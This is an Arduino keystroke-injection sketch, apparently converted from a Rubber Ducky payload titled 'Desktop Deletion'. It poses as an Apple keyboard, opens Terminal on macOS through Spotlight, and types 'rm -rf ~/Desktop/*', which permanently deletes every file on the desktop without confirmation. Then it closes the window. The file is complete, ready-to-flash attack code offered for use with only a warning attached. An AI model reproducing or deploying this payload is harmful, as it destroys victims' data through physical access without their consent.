// Generated with <3 by Dckuino.js !
// EXTREMELY DANGEEROUS. USE AT YOUR OWN RISK

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // Title: Desktop Deletion
  // Author: NARSTY
  // Description: Opens Terminal and enters commands to delete ALL files and folders located on Desktop
  // Please exercise caution when using this command
  // It will permanently delete all files & Folder on the desktop without any confirmation prompts
  // Target: MacOS
  // Version: 1.0
  // Category: Execution
  // ID 05ac:021e Apple:Keyboard
  delay(300);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal.app");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("rm -rf ~/Desktop/*");

  delay(2000);

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}